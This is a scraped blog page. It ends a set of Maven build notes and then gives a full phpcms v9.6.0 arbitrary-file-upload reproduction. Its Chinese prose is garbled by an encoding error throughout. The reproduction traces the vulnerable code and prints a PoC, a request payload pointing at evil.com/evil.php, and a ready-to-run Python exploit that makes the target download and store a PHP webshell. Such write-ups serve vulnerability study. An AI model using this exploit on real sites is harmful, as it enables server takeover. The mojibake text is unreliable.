  &lt;properties&gt;
    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
  &lt;/properties&gt;


    &lt;dependencyManagement&gt;
      &lt;dependencies&gt;
        &lt;dependency&gt;
          &lt;groupId&gt;junit&lt;/groupId&gt;
          &lt;artifactId&gt;junit&lt;/artifactId&gt;
          &lt;version&gt;3.8.1&lt;/version&gt;
          &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
          &lt;/dependencies&gt;
    &lt;/dependencyManagement&gt;
&lt;/project&gt;
</code></pre>
<p>å°†ç›¸åŒçš„ä¾èµ–éƒ½æ·»åŠ åˆ°dependencyManagementä¸‹ï¼Œå¹¶ä¿®æ”¹packagingä¸ºpom</p>
<p>maven01å’Œmaven02çš„pomæ–‡ä»¶å‡ä¸ºï¼š</p>
<pre><code class="xml">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;

  &lt;groupId&gt;top.ccreater&lt;/groupId&gt;
  &lt;artifactId&gt;maven02&lt;/artifactId&gt;
  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
  &lt;packaging&gt;jar&lt;/packaging&gt;

  &lt;name&gt;maven02&lt;/name&gt;
  &lt;url&gt;http://maven.apache.org&lt;/url&gt;

  &lt;properties&gt;
    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
  &lt;/properties&gt;
    &lt;parent&gt;
      &lt;groupId&gt;top.ccreater&lt;/groupId&gt;
      &lt;artifactId&gt;maven03(/maven02)&lt;/artifactId&gt;
      &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
    &lt;/parent&gt;
  &lt;dependencies&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;junit&lt;/groupId&gt;
      &lt;artifactId&gt;junit&lt;/artifactId&gt;
    &lt;/dependency&gt;
  &lt;/dependencies&gt;
&lt;/project&gt;
</code></pre>
<h3 id="Super-POM"><a href="#Super-POM" class="headerlink" title="Super POM"></a>Super POM</h3><p>æ‰€æœ‰çš„ POM éƒ½ç»§æ‰¿è‡ªä¸€ä¸ªçˆ¶ POMï¼ˆæ— è®ºæ˜¯å¦æ˜¾å¼å®šä¹‰äº†è¿™ä¸ªçˆ¶ POMï¼‰ã€‚çˆ¶ POM ä¹Ÿè¢«ç§°ä½œ <strong>Super POM</strong>ï¼Œå®ƒåŒ…å«äº†ä¸€äº›å¯ä»¥è¢«ç»§æ‰¿çš„é»˜è®¤è®¾ç½®ã€‚</p>
<p>Maven ä½¿ç”¨ effective pomï¼ˆSuper pom åŠ ä¸Šå·¥ç¨‹è‡ªå·±çš„é…ç½®ï¼‰æ¥æ‰§è¡Œç›¸å…³çš„ç›®æ ‡ï¼Œå®ƒå¸®åŠ©å¼€å‘è€…åœ¨ pom.xml ä¸­åšå°½å¯èƒ½å°‘çš„é…ç½®ï¼Œå½“ç„¶è¿™äº›é…ç½®å¯ä»¥è¢«æ–¹ä¾¿çš„é‡å†™ã€‚</p>
<p>æŸ¥çœ‹ Super POM é»˜è®¤é…ç½®çš„ä¸€ä¸ªç®€å•æ–¹æ³•æ˜¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š<strong>mvn help:effective-pom</strong> ï¼ˆéœ€è¦åœ¨å½“å‰ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªpom.xmlï¼‰</p>
<h3 id="POM-æ ‡ç­¾è¯¦è§£"><a href="#POM-æ ‡ç­¾è¯¦è§£" class="headerlink" title="POM æ ‡ç­¾è¯¦è§£"></a>POM æ ‡ç­¾è¯¦è§£</h3><p><a href="https://www.runoob.com/maven/maven-pom.html" target="_blank" rel="noopener">https://www.runoob.com/maven/maven-pom.html</a></p>
<h2 id="Maven-æ„å»ºç”Ÿå‘½å‘¨æœŸ"><a href="#Maven-æ„å»ºç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Maven æ„å»ºç”Ÿå‘½å‘¨æœŸ"></a>Maven æ„å»ºç”Ÿå‘½å‘¨æœŸ</h2><p> Maven æ„å»ºç”Ÿå‘½å‘¨æœŸå®šä¹‰äº†ä¸€ä¸ªé¡¹ç›®æ„å»ºè·Ÿå‘å¸ƒçš„è¿‡ç¨‹ã€‚ </p>
<p>Maven æœ‰ä»¥ä¸‹ä¸‰ä¸ªæ ‡å‡†çš„ç”Ÿå‘½å‘¨æœŸï¼š</p>
<ul>
<li><strong>clean</strong>ï¼šé¡¹ç›®æ¸…ç†çš„å¤„ç†</li>
<li><strong>default(æˆ– build)</strong>ï¼šé¡¹ç›®éƒ¨ç½²çš„å¤„ç†</li>
<li><strong>site</strong>ï¼šé¡¹ç›®ç«™ç‚¹æ–‡æ¡£åˆ›å»ºçš„å¤„ç†</li>
</ul>
<h3 id="å…¸å‹çš„ç”Ÿå‘½æ„å»ºå‘¨æœŸ"><a href="#å…¸å‹çš„ç”Ÿå‘½æ„å»ºå‘¨æœŸ" class="headerlink" title="å…¸å‹çš„ç”Ÿå‘½æ„å»ºå‘¨æœŸ"></a>å…¸å‹çš„ç”Ÿå‘½æ„å»ºå‘¨æœŸ</h3><table>
<thead>
<tr>
<th align="left">é˜¶æ®µ</th>
<th align="left">å¤„ç†</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">éªŒè¯ validate</td>
<td align="left">éªŒè¯é¡¹ç›®</td>
<td align="left">éªŒè¯é¡¹ç›®æ˜¯å¦æ­£ç¡®ä¸”æ‰€æœ‰å¿…é¡»ä¿¡æ¯æ˜¯å¯ç”¨çš„</td>
</tr>
<tr>
<td align="left">ç¼–è¯‘ compile</td>
<td align="left">æ‰§è¡Œç¼–è¯‘</td>
<td align="left">æºä»£ç ç¼–è¯‘åœ¨æ­¤é˜¶æ®µå®Œæˆ</td>
</tr>
<tr>
<td align="left">æµ‹è¯• Test</td>
<td align="left">æµ‹è¯•</td>
<td align="left">ä½¿ç”¨é€‚å½“çš„å•å…ƒæµ‹è¯•æ¡†æ¶ï¼ˆä¾‹å¦‚JUnitï¼‰è¿è¡Œæµ‹è¯•ã€‚</td>
</tr>
<tr>
<td align="left">åŒ…è£… package</td>
<td align="left">æ‰“åŒ…</td>
<td align="left">åˆ›å»ºJAR/WARåŒ…å¦‚åœ¨ pom.xml ä¸­å®šä¹‰æåŠçš„åŒ…</td>
</tr>
<tr>
<td align="left">æ£€æŸ¥ verify</td>
<td align="left">æ£€æŸ¥</td>
<td align="left">å¯¹é›†æˆæµ‹è¯•çš„ç»“æœè¿›è¡Œæ£€æŸ¥ï¼Œä»¥ä¿è¯è´¨é‡è¾¾æ ‡</td>
</tr>
<tr>
<td align="left">å®‰è£… install</td>
<td align="left">å®‰è£…</td>
<td align="left">å®‰è£…æ‰“åŒ…çš„é¡¹ç›®åˆ°æœ¬åœ°ä»“åº“ï¼Œä»¥ä¾›å…¶ä»–é¡¹ç›®ä½¿ç”¨</td>
</tr>
<tr>
<td align="left">éƒ¨ç½² deploy</td>
<td align="left">éƒ¨ç½²</td>
<td align="left">æ‹·è´æœ€ç»ˆçš„å·¥ç¨‹åŒ…åˆ°è¿œç¨‹ä»“åº“ä¸­ï¼Œä»¥å…±äº«ç»™å…¶ä»–å¼€å‘äººå‘˜å’Œå·¥ç¨‹</td>
</tr>
</tbody></table>
<p>å¦‚æœæ‰§è¡Œpackageï¼Œé‚£ä¹ˆclean,testç­‰éƒ½ä¼šè¢«æ‰§è¡Œ</p>
<h3 id="æ„å»ºé˜¶æ®µç”±æ’ä»¶ç›®æ ‡æ„æˆ"><a href="#æ„å»ºé˜¶æ®µç”±æ’ä»¶ç›®æ ‡æ„æˆ" class="headerlink" title="æ„å»ºé˜¶æ®µç”±æ’ä»¶ç›®æ ‡æ„æˆ"></a>æ„å»ºé˜¶æ®µç”±æ’ä»¶ç›®æ ‡æ„æˆ</h3><p> ä¸€ä¸ªæ’ä»¶ç›®æ ‡ä»£è¡¨ä¸€ä¸ªç‰¹å®šçš„ä»»åŠ¡ï¼ˆæ¯”æ„å»ºé˜¶æ®µæ›´ä¸ºç²¾ç»†ï¼‰ï¼Œè¿™æœ‰åŠ©äºé¡¹ç›®çš„æ„å»ºå’Œç®¡ç†ã€‚è¿™äº›ç›®æ ‡å¯èƒ½è¢«ç»‘å®šåˆ°å¤šä¸ªé˜¶æ®µæˆ–è€…æ— ç»‘å®šã€‚ä¸ç»‘å®šåˆ°ä»»ä½•æ„å»ºé˜¶æ®µçš„ç›®æ ‡å¯ä»¥åœ¨æ„å»ºç”Ÿå‘½å‘¨æœŸä¹‹å¤–é€šè¿‡ç›´æ¥è°ƒç”¨æ‰§è¡Œã€‚è¿™äº›ç›®æ ‡çš„æ‰§è¡Œé¡ºåºå–å†³äºè°ƒç”¨ç›®æ ‡å’Œæ„å»ºé˜¶æ®µçš„é¡ºåºã€‚ </p>
<p>æ’ä»¶ç›®æ ‡è§£é‡Šï¼š ä¸€ä¸ªæ’ä»¶æœ‰å¤šä¸ªç›®æ ‡ï¼Œæ¯ä¸ªåŠŸèƒ½å°±æ˜¯ä¸€ä¸ª<em>æ’ä»¶ç›®æ ‡</em>ï¼Œæ‰€ä»¥ä¸€ä¸ªæ’ä»¶æœ‰å¤šä¸ªåŠŸèƒ½ã€‚ </p>
<h2 id="maven-å¸¸ç”¨å‘½ä»¤"><a href="#maven-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="maven å¸¸ç”¨å‘½ä»¤"></a>maven å¸¸ç”¨å‘½ä»¤</h2><pre><code class="shell">mvn -v
mvn compile ç¼–è¯‘
mvn test æµ‹è¯•
mvn package æ‰“åŒ…é¡¹ç›®ç”Ÿæˆjaræ–‡ä»¶
mvn clearn åˆ é™¤target ç›®å½•
mvn install å®‰è£…jaråŒ…åˆ°æœ¬åœ°ä»“åº“
åˆ›å»ºç›®å½•çš„ä¸¤ç§æ–¹å¼
1. äº¤äº’å¼
mvn archetype:generate 
2. éäº¤äº’å¼
mvn archetype:generate -DgroupId=com.companyname.bank -DartifactId=consumerBanking -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false</code></pre>
<h2 id="åœ¨æŸä¸ªé˜¶æ®µä½¿ç”¨æ’ä»¶"><a href="#åœ¨æŸä¸ªé˜¶æ®µä½¿ç”¨æ’ä»¶" class="headerlink" title="åœ¨æŸä¸ªé˜¶æ®µä½¿ç”¨æ’ä»¶"></a>åœ¨æŸä¸ªé˜¶æ®µä½¿ç”¨æ’ä»¶</h2><p> <a href="http://maven.apache.org/plugins" target="_blank" rel="noopener">http://maven.apache.org/plugins</a> </p>
<p>å„ä¸ªæ’ä»¶ä¸‹æœ‰ä¸ªexample configå¦‚ï¼š <a href="http://maven.apache.org/plugins/maven-source-plugin/" target="_blank" rel="noopener">http://maven.apache.org/plugins/maven-source-plugin/</a> </p>
<p>åœ¨pom.xmlæ–‡ä»¶ä¸­projectä¸‹æ·»åŠ </p>
<pre><code class="xml">&lt;build&gt;
    &lt;plugins&gt;
      &lt;plugin&gt;
        &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
        &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt;
        &lt;version&gt;3.2.0&lt;/version&gt;
        &lt;!--  &lt;configuration&gt;
          &lt;outputDirectory&gt;/absolute/path/to/the/output/directory&lt;/outputDirectory&gt;
          &lt;finalName&gt;filename-of-generated-jar-file&lt;/finalName&gt;
          &lt;attach&gt;false&lt;/attach&gt;
        &lt;/configuration&gt;--&gt;
        &lt;executions&gt;
            &lt;execution&gt;
                &lt;phase&gt;package&lt;/phase&gt;
                &lt;goals&gt;
                &lt;goal&gt;jar-no-fork&lt;/goal&gt;
                &lt;!-- åœ¨packageé˜¶æ®µæ‰§è¡Œsource:jar-no-fork --&gt;
            &lt;/goals&gt;
            &lt;/execution&gt;

        &lt;/executions&gt;
      &lt;/plugin&gt;
    &lt;/plugins&gt;
  &lt;/build&gt;</code></pre>
<h2 id="mavené…ç½®æ–‡ä»¶"><a href="#mavené…ç½®æ–‡ä»¶" class="headerlink" title="mavené…ç½®æ–‡ä»¶"></a>mavené…ç½®æ–‡ä»¶</h2><h3 id="æ·»åŠ é•œåƒä»“åº“"><a href="#æ·»åŠ é•œåƒä»“åº“" class="headerlink" title="æ·»åŠ é•œåƒä»“åº“"></a>æ·»åŠ é•œåƒä»“åº“</h3><p>åœ¨mirrorsä¸‹æ·»åŠ </p>
<pre><code class="xml">&lt;mirror&gt;
        &lt;id&gt;alimaven&lt;/id&gt;
        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;&lt;!-- å“ªä¸ªä»“åº“çš„é•œåƒï¼Œåˆ©ç”¨*æ¥åŒ¹é…æ‰€æœ‰ä»“åº“ --&gt;
        &lt;name&gt;aliyun maven&lt;/name&gt;
        &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;
    &lt;/mirror&gt;
    &lt;mirror&gt;
        &lt;id&gt;jcenter&lt;/id&gt;
        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
        &lt;name&gt;jcenter.bintray.com&lt;/name&gt;
        &lt;url&gt;http://jcenter.bintray.com/&lt;/url&gt;
    &lt;/mirror&gt;

    &lt;mirror&gt;
        &lt;id&gt;repo1&lt;/id&gt;
        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
        &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;
        &lt;url&gt;http://repo1.maven.org/maven2/&lt;/url&gt;
    &lt;/mirror&gt;
    &lt;mirror&gt;
        &lt;id&gt;repo2&lt;/id&gt;
        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
        &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;
        &lt;url&gt;http://repo2.maven.org/maven2/&lt;/url&gt;
    &lt;/mirror&gt;</code></pre>
<h3 id="ä¿®æ”¹æœ¬åœ°ä»“åº“åœ°å€"><a href="#ä¿®æ”¹æœ¬åœ°ä»“åº“åœ°å€" class="headerlink" title="ä¿®æ”¹æœ¬åœ°ä»“åº“åœ°å€"></a>ä¿®æ”¹æœ¬åœ°ä»“åº“åœ°å€</h3><p>ä¿®æ”¹<code>&lt;localRepository&gt;E:/apache-maven-3.6.3/repository&lt;/localRepository&gt;</code></p>
<h2 id="å¸¸ç”¨æ’ä»¶ä»‹ç»"><a href="#å¸¸ç”¨æ’ä»¶ä»‹ç»" class="headerlink" title="å¸¸ç”¨æ’ä»¶ä»‹ç»"></a>å¸¸ç”¨æ’ä»¶ä»‹ç»</h2><p> jetty : servlet æœ¬åœ°æµ‹è¯•æ’ä»¶</p>
<p> <a href="http://tomcat.apache.org/maven-plugin.html" target="_blank" rel="noopener">tomcat</a>  :  tomcat  æœ¬åœ°æµ‹è¯•æ’ä»¶</p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/mavenå­¦ä¹ ç¬”è®°/">https://www.ccreater.top/1970/01/01/mavenå­¦ä¹ ç¬”è®°/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckmn575790069s1nihkex583y" data-title="mavenå­¦ä¹ ç¬”è®°" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-phpcms960ä»»æ„æ–‡ä»¶ä¸Šä¼ å¤ç°" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cveå¤ç°</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/">phpcms960ä»»æ„æ–‡ä»¶ä¸Šä¼ å¤ç°</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpcmsv9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#phpcmsv9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="phpcmsv9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>phpcmsv9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ </h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>phpcms v9.6.0</p>
<p>å¼€å¯ç”¨æˆ·æ³¨å†ŒåŠŸèƒ½</p>
<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ ¹æ®ç½‘ç»œä¸Šæä¾›çš„pocè¿›è¡Œæ¼æ´å¤ç°:</p>
<pre><code class="python">import re
import requests


def poc(url):
    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)
    data = {
        &#39;siteid&#39;: &#39;1&#39;,
        &#39;modelid&#39;: &#39;1&#39;,
        &#39;username&#39;: &#39;test&#39;,
        &#39;password&#39;: &#39;testxx&#39;,
        &#39;email&#39;: &#39;test@test.com&#39;,
        &#39;info[content]&#39;: &#39;&lt;img src=http://url/shell.txt?.php#.jpg&gt;&#39;,
        &#39;dosubmit&#39;: &#39;1&#39;,
    }
    rep = requests.post(u, data=data)

    shell = &#39;&#39;
    re_result = re.findall(r&#39;&amp;lt;img src=(.*)&amp;gt&#39;, rep.content)
    if len(re_result):
        shell = re_result[0]
        print shell
</code></pre>
<p>æ¼æ´çš„å…³é”®ä½ç½®</p>
<p><code>phpcms/modules/member/index.php</code>:135</p>
<pre><code class="php">if($member_setting[&#39;choosemodel&#39;]) {
    require_once CACHE_MODEL_PATH.&#39;member_input.class.php&#39;;
    require_once CACHE_MODEL_PATH.&#39;member_update.class.php&#39;;
    $member_input = new member_input($userinfo[&#39;modelid&#39;]);        
    $_POST[&#39;info&#39;] = array_map(&#39;new_html_special_chars&#39;,$_POST[&#39;info&#39;]);
    $user_model_info = $member_input-&gt;get($_POST[&#39;info&#39;]);                                        
}</code></pre>
<p><code>$_POST[&#39;info&#39;]</code>è¢«<code>new_html_special_chars</code>å¤„ç†å,ç›´æ¥ä½œä¸ºå‚æ•°ä¼ å…¥<code>$member_input-&gt;get</code></p>
<p>è·Ÿè¿›å»å‘ç°</p>
<pre><code class="php">if(is_array($data)) {
            foreach($data as $field=&gt;$value) {
                ...
                $field = safe_replace($field);
                ...
                $func = $this-&gt;fields[$field][&#39;formtype&#39;];
                if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value);

                $info[$field] = $value;
            }
        }</code></pre>
<p><code>$this-&gt;$func($field, $value);</code>ä»¤äººæµ®æƒ³è”ç¿©çš„å‘½ä»¤,è€Œ<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code>,å…¶ä¸­<code>$field</code>æ˜¯æˆ‘ä»¬å¯æ§çš„è¾“å…¥<code>new_html_special_chars($_POST[&#39;info&#39;]) as $field=&gt;$value</code></p>
<p>è€Œ<code>$this-&gt;fields[$field][&#39;formtype&#39;];</code>æœ‰ä»¥ä¸‹å–å€¼,æˆ‘ä»¬å¯ä»¥æ§åˆ¶å…¶æ‰§è¡ŒæŸä¸€å‡½æ•°</p>
<pre><code class="php">$this-&gt;fields[&#39;catid&#39;][&#39;formtype&#39;]=&quot;catid&quot;
$this-&gt;fields[&#39;typeid&#39;][&#39;formtype&#39;]=&quot;typeid&quot;
$this-&gt;fields[&#39;title&#39;][&#39;formtype&#39;]=&quot;title&quot;
$this-&gt;fields[&#39;keywords&#39;][&#39;formtype&#39;]=&quot;keyword&quot;
$this-&gt;fields[&#39;copyfrom&#39;][&#39;formtype&#39;]=&quot;copyfrom&quot;
$this-&gt;fields[&#39;description&#39;][&#39;formtype&#39;]=&quot;textarea&quot;
$this-&gt;fields[&#39;updatetime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;
$this-&gt;fields[&#39;content&#39;][&#39;formtype&#39;]=&quot;editor&quot;
$this-&gt;fields[&#39;thumb&#39;][&#39;formtype&#39;]=&quot;image&quot;
$this-&gt;fields[&#39;relation&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;
$this-&gt;fields[&#39;pages&#39;][&#39;formtype&#39;]=&quot;pages&quot;
$this-&gt;fields[&#39;inputtime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;
$this-&gt;fields[&#39;posids&#39;][&#39;formtype&#39;]=&quot;posid&quot;
$this-&gt;fields[&#39;groupids_view&#39;][&#39;formtype&#39;]=&quot;groupid&quot;
$this-&gt;fields[&#39;voteid&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;
$this-&gt;fields[&#39;islink&#39;][&#39;formtype&#39;]=&quot;islink&quot;
$this-&gt;fields[&#39;url&#39;][&#39;formtype&#39;]=&quot;text&quot;
$this-&gt;fields[&#39;listorder&#39;][&#39;formtype&#39;]=&quot;number&quot;
$this-&gt;fields[&#39;template&#39;][&#39;formtype&#39;]=&quot;template&quot;
$this-&gt;fields[&#39;allow_comment&#39;][&#39;formtype&#39;]=&quot;box&quot;
$this-&gt;fields[&#39;status&#39;][&#39;formtype&#39;]=&quot;box&quot;
$this-&gt;fields[&#39;readpoint&#39;][&#39;formtype&#39;]=&quot;readpoint&quot;
$this-&gt;fields[&#39;username&#39;][&#39;formtype&#39;]=&quot;text&quot;</code></pre>
<p>ä¸€ä¸ªä¸€ä¸ªæŸ¥çœ‹æœ€åå‘ç°:</p>
<pre><code class="php">    function editor($field, $value) {
        $setting = string2array($this-&gt;fields[$field][&#39;setting&#39;]);
        $enablesaveimage = $setting[&#39;enablesaveimage&#39;];
        $site_setting = string2array($this-&gt;site_config[&#39;setting&#39;]);
        $watermark_enable = intval($site_setting[&#39;watermark_enable&#39;]);
        $value = $this-&gt;attachment-&gt;download(&#39;content&#39;, $value,$watermark_enable);
        return $value;
    }</code></pre>
<p><code>editor</code>ä¼šè°ƒç”¨downloadæ–¹æ³•,å…¶ä¸­<code>$field</code>å’Œ<code>$value</code>éƒ½æ˜¯å¯æ§çš„</p>
<p>è·Ÿè¿›<code>download</code>:</p>
<pre><code class="php">function download($field, $value,$watermark = &#39;0&#39;,$ext = &#39;gif|jpg|jpeg|bmp|png&#39;, $absurl = &#39;&#39;, $basehref = &#39;&#39;)
    {
        global $image_d;
        $this-&gt;att_db = pc_base::load_model(&#39;attachment_model&#39;);
        $upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);
        $this-&gt;field = $field;
        $dir = date(&#39;Y/md/&#39;);
        $uploadpath = $upload_url.$dir;
        $uploaddir = $this-&gt;upload_root.$dir;
        $string = new_stripslashes($value);
        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;
        $remotefileurls = array();
        foreach($matches[3] as $matche)
        {
            if(strpos($matche, &#39;://&#39;) === false) continue;
            dir_create($uploaddir);
            $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref);
        }
        unset($matches, $string);
        $remotefileurls = array_unique($remotefileurls);
        $oldpath = $newpath = array();
        foreach($remotefileurls as $k=&gt;$file) {
            if(strpos($file, &#39;://&#39;) === false || strpos($file, $upload_url) !== false) continue;
            $filename = fileext($file);
            $file_name = basename($file);
            $filename = $this-&gt;getname($filename);

            $newfile = $uploaddir.$filename;
            $upload_func = $this-&gt;upload_func;
            if($upload_func($file, $newfile)) {
                $oldpath[] = $k;
                $GLOBALS[&#39;downloadfiles&#39;][] = $newpath[] = $uploadpath.$filename;
                @chmod($newfile, 0777);
                $fileext = fileext($filename);
                if($watermark){
                    watermark($newfile, $newfile,$this-&gt;siteid);
                }
                $filepath = $dir.$filename;
                $downloadedfile = array(&#39;filename&#39;=&gt;$filename, &#39;filepath&#39;=&gt;$filepath, &#39;filesize&#39;=&gt;filesize($newfile), &#39;fileext&#39;=&gt;$fileext);
                $aid = $this-&gt;add($downloadedfile);
                $this-&gt;downloadedfiles[$aid] = $filepath;
            }
        }
        return str_replace($oldpath, $newpath, $value);
    }    </code></pre>
<p><code>download</code>ç”¨<code>$upload_func($file, $newfile)</code>æ¥ä¸‹è½½æ–‡ä»¶åˆ°æœåŠ¡å™¨,è€Œ<code>$upload_func=&quot;copy&quot;</code></p>
<p>æˆ‘ä»¬åˆ†æä¸€ä¸‹<code>download</code>å‡½æ•°,<code>$file</code>å’Œ<code>$newfile</code>ç»è¿‡çš„å¤„ç†</p>
<p><code>$file</code>æ˜¯<code>$remotefileurls</code>ä¸­çš„å€¼</p>
<pre><code class="php">        $string = new_stripslashes($value);//åè½¬ä¹‰
        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;
        $remotefileurls = array();
        foreach($matches[3] as $matche)
        {
            if(strpos($matche, &#39;://&#39;) === false) continue;
            dir_create($uploaddir);
            $remotefileurls[$matche] = $this-&gt;fillurl($matche, &#39;&#39;, &#39;&#39;);
        }</code></pre>
<p>è·Ÿè¿›<code>$this-&gt;fillurl</code>,å¤§æ¦‚åŠŸèƒ½æ˜¯,å»æ‰url<code>#</code>åé¢çš„ä¸œè¥¿</p>
<pre><code class="php">function fillurl($surl, $absurl, $basehref = &#39;&#39;) {
        ...
        $pos = strpos($surl,&#39;#&#39;);
        if($pos&gt;0) $surl = substr($surl,0,$pos);
        ...
    }</code></pre>
<p>æ„é€ <code>$value=&#39;src=http://evil.com/evil.php#.jpg&#39;</code></p>
<p>æˆ‘ä»¬å†çœ‹ä¸‹<code>$newfile</code></p>
<pre><code class="php">$dir = date(&#39;Y/md/&#39;);
$uploaddir = $this-&gt;upload_root.$dir;
$filename = fileext($file);
$filename = $this-&gt;getname($filename);
$newfile = $uploaddir.$filename;</code></pre>
<p><code>$this-&gt;getname</code>:</p>
<pre><code class="php">function getname($fileext){
        return date(&#39;Ymdhis&#39;).rand(100, 999).&#39;.&#39;.$fileext;
    }</code></pre>
<p>webshellçš„åœ°å€ä¸º:<code>http://website/uploadfile/date(&#39;Y/md/&#39;)/date(&#39;Ymdhis&#39;).rand(100, 999).php</code></p>
<p>æœ€åpayloadä¸º:</p>
<pre><code>/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1
post:
info[content]=&lt;img src=&quot;http://evil.com/evil.php&quot;&gt;</code></pre><h2 id="åˆ©ç”¨è„šæœ¬"><a href="#åˆ©ç”¨è„šæœ¬" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h2><pre><code class="python">import re
import requests
import random

def exp(url,evilurl=&quot;http://xxxxxxx/evil.php&quot;):
    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)
    data = {
        &#39;siteid&#39;: &#39;1&#39;,
        &#39;modelid&#39;: &#39;1&#39;,
        &#39;username&#39;: &#39;test%d&#39;%random.randint(1,999999),
        &#39;password&#39;: &#39;testxx&#39;,
        &#39;email&#39;: &#39;test%d@test.com&#39;%random.randint(1,999999),
        &#39;info[content]&#39;: &#39;src=%s#.jpg&#39;%evilurl,
        &#39;dosubmit&#39;: &#39;1&#39;,
    }
    rep = requests.post(u, data=data)
    result=re.search(r&quot;VALUES \(&#39;src=(.*)&#39;,&#39;\d*&#39;\)&quot;,rep.text).groups()
    print(rep.text)
    print(result)


exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/phpcms960ä»»æ„æ–‡ä»¶ä¸Šä¼ å¤ç°/">https://www.ccreater.top/1970/01/01/phpcms960ä»»æ„æ–‡ä»¶ä¸Šä¼ å¤ç°/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
